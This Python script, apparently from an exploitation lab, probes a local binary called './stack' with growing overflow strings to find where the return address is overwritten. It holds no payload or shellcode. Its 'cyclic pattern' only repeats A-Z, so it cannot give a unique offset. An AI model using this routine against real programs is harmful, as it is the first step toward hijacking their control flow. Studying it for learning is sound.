#!/usr/bin/env python3

import subprocess
import struct

def create_pattern(length):
    """Create a cyclic pattern to identify offset"""
    pattern = ""
    for i in range(length):
        pattern += chr(ord('A') + (i % 26))
    return pattern

def test_with_pattern():
    # Create a pattern that's long enough to overwrite return address
    pattern = create_pattern(100)
    
    print(f"Testing with pattern: {pattern[:50]}...")
    
    try:
        result = subprocess.run(['./stack', pattern], capture_output=True, text=True, timeout=5)
        print(f"Return code: {result.returncode}")
        print(f"Stdout: {result.stdout}")
        print(f"Stderr: {result.stderr}")
    except Exception as e:
        print(f"Error: {e}")

def find_return_address_offset():
    """Find the exact offset where return address is overwritten"""
    base_size = 64  # We know crash starts here
    
    # Try different offsets within the crashing range
    for offset in range(0, 20, 4):  # Try every 4 bytes
        size = base_size + offset
        payload = "A" * (size - 4) + "BBBB"  # Fill buffer + 4 bytes for return address
        
        try:
            result = subprocess.run(['./stack', payload], capture_output=True, text=True, timeout=5)
            print(f"Offset +{offset} (size {size}): Return code {result.returncode}")
        except Exception as e:
            print(f"Offset +{offset}: Error {e}")

if __name__ == "__main__":
    print("=== Finding return address offset ===")
    find_return_address_offset()
    print("\n=== Testing with pattern ===")
    test_with_pattern()